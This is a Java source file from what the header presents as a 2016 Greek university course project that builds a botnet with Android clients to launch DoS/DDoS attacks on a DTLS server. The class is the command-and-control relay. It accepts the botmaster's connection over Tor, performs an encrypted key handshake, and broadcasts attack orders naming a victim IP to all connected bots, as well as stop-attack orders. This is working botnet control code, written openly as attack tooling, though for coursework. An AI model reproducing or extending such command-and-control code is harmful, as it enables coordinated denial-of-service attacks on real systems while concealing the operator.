/**
 *                     Πανεπιστήμιο Αιγαίου
 *      Τμήμα Μηχανικών Πληροφοριακών & Επικοινωνιακών Συστημάτων
 * 
 *          Ασφάλεια Ασύρματων & Κινητών Δικτύων Επικοινωνιών
 *                     Εαρινό Εξάμηνο 2016
 *                      Project Μαθήματος
 * 
 * Δημιουργία secure botnet με android clients & Dos/DDoS σε DTLS Server.
 * 
 *          Πέππας Κωνσταντίνος 321/2011134 - icsd11134@icsd.aegean.gr
 *          Σωτηρέλης Χρήστος   321/2012182 - icsd12182@icsd.aegean.gr
 *          Χαϊκάλης Νικόλαος   321/2012200 - icsd12200@icsd.aegean.gr
 * 
 *          Καθηγητής Μαθήματος: Γ. Καμπουράκης 
 * 
 */

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.util.ArrayList;
import javax.crypto.SecretKey;
import javax.swing.JTextArea;
import botnet.botmasterandroidclient.*;
import botnet.botmasterandroidclient.Bot_Properties;
import botnet.botmasterandroidclient.Attack_Properties;

/**
 * Method pou edraiwnw tin epikoinwnia tou Botmaster(Server) mazi me tou
 * CnC Client.
 */
public class ChatWithBotMaster implements Serializable{
    private int port;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private PrivateKey Priv;
    private PublicKey Pub;
    private PublicKey MasterPub;
    private SecretKey secKey;
    private Messages msgs = new Messages();
    private JTextArea MasterText;
    private Chat chating = new Chat();
    private boolean keepWalking = true; //gia na spaei to Chat Thread.
    private EncryptDecrypt EncDecr = new EncryptDecrypt();
    private TorConnection tor;
    private ArrayList<ObjectOutputStream> Bots = new ArrayList(); //exun k OOS.
    
    
    
    public ChatWithBotMaster(){}
    public ChatWithBotMaster(int port, JTextArea MasterText) {
        this.port = port;
        this.MasterText = MasterText;
    }
    
      /**
     * Methodos pou arhizw to Connection me ton BotMaster
     * Dedomenou pws mono enas xristis borei na einai BotMaster kathe fora
     * den xrisimopoiw MultiThread Server gia tin epikoinwnia tou
     * C&C Server me ton BotMaster.
     */
    public void StartConnection(){
        MasterText.append("Waiting for Botmaster...\n");
        tor = new TorConnection(port);
        tor.EstablishTorConnection();
        MasterText.append("BotMaster is back online.\n");
        oos = tor.getOos();
        ois = tor.getOis();
        HandShake();
    }
    
    public void StopConnection(){
        keepWalking = false;
        Chat_Thread.interrupt();
        tor.StopConnection();
    }
    
    public void HandShake(){
        chating = new Chat(oos, ois, "C&C Server");
        EncDecr.CreateKeys();
        Priv = EncDecr.getPriv();
        Pub = EncDecr.getPubKey();
        chating.SendMessage(Pub);
        while(keepWalking == true){
            byte[] readByte = chating.ReadBytes();
            if(readByte != null){
                secKey = EncDecr.DecryptSecKey(readByte, Priv);
                //System.out.println("sec key: " + secKey);
                MasterText.append("HandShake Complete\n");
                break;
            }
        }
        Chat_Thread.start();
    }
    

    
    private Thread Chat_Thread = new Thread(() -> {
        while(keepWalking == true){
            byte[] readByte = chating.ReadBytes();
            if(readByte != null){ 
                //MasterText.append(readByte.toString() + "\n");
                //Object obj = EncDecr.deserialize(readByte);
                readByte = EncDecr.DecryptWithSecKey(readByte, secKey);
                Object obj = EncDecr.deserialize(readByte);
                //String s = new String(readByte);
                System.out.println("Obj: " + obj.toString() );
                MasterText.append(obj.toString()+"\n");
                if(obj.toString().equals(msgs.StopConnection())){
                    MasterText.append("BotMaster has gone offline.\n");
                    chating.SendBytes(EncDecr.EncryptWithSecKey((Object) msgs.StopConnection(), secKey));
                    StopConnection();
                    
                }
                else if(obj.toString().equals(msgs.GreetingsServer())){
                    chating.SendBytes(EncDecr.EncryptWithSecKey((Object) msgs.WelcomeMaster(), secKey));
                } 
                else if(obj instanceof Attack_Properties){
                    Attack_Properties ap = new Attack_Properties();
                    ap = (Attack_Properties) obj;
                    System.out.println("attack: " + ap.getAttack_Type());
    //                System.out.println("attacking ip : " + ap.getIP_Victim() + "\nsize: " + Bots.size());
                    MasterText.append("Bots Chargeeee !!!\n");
                    System.out.println("Target IP: " + ap.getIP_Victim().toString());
                    for(int i=0; i<Bots.size(); i++){
    //                    System.out.println("oos gia attack: " + Bots.get(i));
                        chating.SendMessageWithOOS(ap, Bots.get(i));
                        //System.out.println("attack");
                    }
                    
                }
                else if(obj.toString().equalsIgnoreCase(msgs.StopAttack())){ //Stamataw tin epithesi sto Victim.
                /**
                * Dinei entoli gia na stamatisei i attack. Den simainei pws kanei
                * logout apo ton server. Sinehizei na einai syndedemenos sto 
                * C&C server.
                */
                MasterText.append("Retreat my Bots ...\n");
                for(int i=0; i<Bots.size(); i++){
//                    System.out.println("oos gia attack: " + Bots.get(i));
                    chating.SendMessageWithOOS(msgs.StopAttack(), Bots.get(i));
//                    System.out.println("attack");
                }
            }
            }
            //System.out.println("again");
        }
    });
    
    public void sendBotList(ArrayList<Bot_Properties> botList) {

        for(int i=0; i<botList.size(); i++){
            System.out.println(botList.get(i).getBotPCname());
            System.out.println(botList.get(i).getBotIP());
        }
        if(!botList.isEmpty()){
            System.out.println("Stelnw lista." + botList);
            chating.SendMessage(EncDecr.EncryptWithSecKey((Object) botList , secKey));
        }
    }

    public int getPort() {
        return port;
    }

    public void setPort(int port) {
        this.port = port;
    }

    public ObjectOutputStream getOos() {
        return oos;
    }

    public void setOos(ObjectOutputStream oos) {
        this.oos = oos;
    }

    public ObjectInputStream getOis() {
        return ois;
    }

    public void setOis(ObjectInputStream ois) {
        this.ois = ois;
    }

    public PrivateKey getPriv() {
        return Priv;
    }

    public void setPriv(PrivateKey Priv) {
        this.Priv = Priv;
    }

    public PublicKey getPub() {
        return Pub;
    }

    public void setPub(PublicKey Pub) {
        this.Pub = Pub;
    }

    public PublicKey getMasterPub() {
        return MasterPub;
    }

    public void setMasterPub(PublicKey MasterPub) {
        this.MasterPub = MasterPub;
    }

    public Messages getMsgs() {
        return msgs;
    }

    public void setMsgs(Messages msgs) {
        this.msgs = msgs;
    }

    public JTextArea getMasterText() {
        return MasterText;
    }

    public void setMasterText(JTextArea MasterText) {
        this.MasterText = MasterText;
    }

    public Chat getChating() {
        return chating;
    }

    public void setChating(Chat chating) {
        this.chating = chating;
    }

    public boolean isKeepWalking() {
        return keepWalking;
    }

    public void setKeepWalking(boolean keepWalking) {
        this.keepWalking = keepWalking;
    }


    public TorConnection getTor() {
        return tor;
    }

    public void setTor(TorConnection tor) {
        this.tor = tor;
    }

    public Thread getChat_Thread() {
        return Chat_Thread;
    }

    public void setChat_Thread(Thread Chat_Thread) {
        this.Chat_Thread = Chat_Thread;
    }

    public SecretKey getSecKey() {
        return secKey;
    }

    public void setSecKey(SecretKey secKey) {
        this.secKey = secKey;
    }

    public EncryptDecrypt getEncDecr() {
        return EncDecr;
    }

    public void setEncDecr(EncryptDecrypt EncDecr) {
        this.EncDecr = EncDecr;
    }

    public ArrayList<ObjectOutputStream> getBots() {
        return Bots;
    }

    public void setBots(ArrayList<ObjectOutputStream> Bots) {
        this.Bots = Bots;
    }
    
    
    
}
